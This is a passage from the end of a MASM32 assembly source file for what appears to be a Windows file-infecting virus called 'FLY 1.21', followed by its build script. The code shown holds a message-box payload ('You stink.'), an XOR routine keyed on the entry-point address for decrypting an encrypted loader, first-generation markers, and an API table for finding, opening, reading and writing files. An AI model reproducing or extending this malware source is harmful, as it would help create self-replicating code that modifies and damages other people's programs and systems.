	MOV     EDI, ESP                                             ; User32 str on stack
	MOV     DWORD PTR [EDI], "RESU"
	MOV     DWORD PTR [EDI + 4], "23"
	; get MessageBoxA addr
	PUSH    EDI
	CALL    [EBP + _LoadLibrary]                                 ; EAX -> U32 base
	ADD     ESP, 8
	OR      EAX, EAX
	JZ      DriveUserNutsHiHi_exit
	LEA     EDI, [EBP + MBStrSize]                               ; EDI -> API info (str size/str)
	MOVZX   EBX, BYTE PTR [EDI]
	PUSH    EBX
	INC     EDI
	PUSH    EDI
	PUSH    EAX
	CALL    GetProcAddr                                          ; EAX -> MessageBoxA addr
	OR      EAX, EAX
	JZ	DriveUserNutsHiHi_exit
	; show msg
	PUSH    MB_SYSTEMMODAL OR MB_ICONWARNING OR MB_TOPMOST
	LEA     EBX, [EBP + szMBCaption]
	PUSH    EBX
	LEA     EBX, [EBP + szMBText]
	PUSH    EBX
	SUB     EBX, EBX
	PUSH    EBX
	CALL    EAX
  DriveUserNutsHiHi_exit:
  	RET
  	
;
; Reserved Regs: NO
;
; Args:
; EBX - EntryPoint RVA
;
; Returns: xor byte to dexor loader data parition in EAX
;
GetXorByte:
	SUB     EAX, EAX
	SUB     ECX, ECX
	ADD     CL, 4
  GetXorByte_loop:
        ADD     AL, BL
        SHR     EBX, 8
  	LOOP    GetXorByte_loop
  	RET 	

; ------ VARIABLES ----------------------------------------------------------------------
Loader_Variables:
dwEPRva                                 DD 0                         ; 0 in first generation

Variable_Crypt_Start:
dwImageBase                             DD 0                         ; 0 in first generation
dwK32Base                               DD ?

bEntryData                              DB 6 DUP (0FFh)

MBStrSize                               DB 11 + 1
szMB                                    DB "MessageBoxA", 0
szMBText                                DB "You stink.", 0
szMBCaption                             DB "FLY 1.21", 0

API_table:
                                        DB 20 + 1
_GetCurrentDirectory                    DD ?
szGetCurrentDirectory                   DB "GetCurrentDirectoryA", 0

                                        DB 20 + 1
_SetCurrentDirectory                    DD ?
szSetCurrentDirectory                   DB "SetCurrentDirectoryA", 0

                                        DB 14 + 1
_FindFirstFile                          DD ?
szFindFirstFile                         DB "FindFirstFileA", 0

                                        DB 13 + 1
_FindNextFile                           DD ?
szFindNextFile                          DB "FindNextFileA", 0

                                        DB 9 + 1
_FindClose                              DD ?
szFindClose                             DB "FindClose", 0

                                        DB 11 + 1
_CreateFile                             DD ?
szCreateFile                            DB "CreateFileA", 0

                                        DB 11 + 1
_CloseHandle                            DD ?
szCloseHandle                           DB "CloseHandle", 0

                                        DB 11 + 1
_GetFileSize                            DD ?
szGetFileSize                           DB "GetFileSize", 0

                                        DB 11 + 1
_GlobalAlloc                            DD ?
szGlobalAlloc                           DB "GlobalAlloc", 0

                                        DB 10 + 1
_GlobalFree                             DD ?
szGlobalFree                            DB "GlobalFree", 0

                                        DB 8 + 1
_ReadFile                               DD ?
szReadFile                              DB "ReadFile", 0

                                        DB 9 + 1
_WriteFile                              DD ?
szWriteFile                             DB "WriteFile", 0

                                        DB 14 + 1
_SetFilePointer                         DD ?
szSetFilePointer                        DB "SetFilePointer", 0
                                        DB 12 + 1
_LoadLibrary                            DD ?
szLoadLibrary                           DB "LoadLibraryA", 0
                                        DB 12 + 1
_GetTickCount                           DD ?
szGetTickCount                          DB "GetTickCount", 0
dwcAPITableEnd                          DB 0
API_table_end:
Loader_Variables_end:
Variable_Crypt_End:

FLY_END:
end Main
; ------ END ----------------------------------------------------------------------------

:MAKE
CLS
\MASM32\BIN\ML /nologo /c /coff /Gz /Cp /Zp1 FLY.BAT
\MASM32\BIN\LINK /nologo /SUBSYSTEM:WINDOWS /SECTION:.text,REW FLY.obj
DEL *.OBJ
ECHO.
PAUSE
CLS
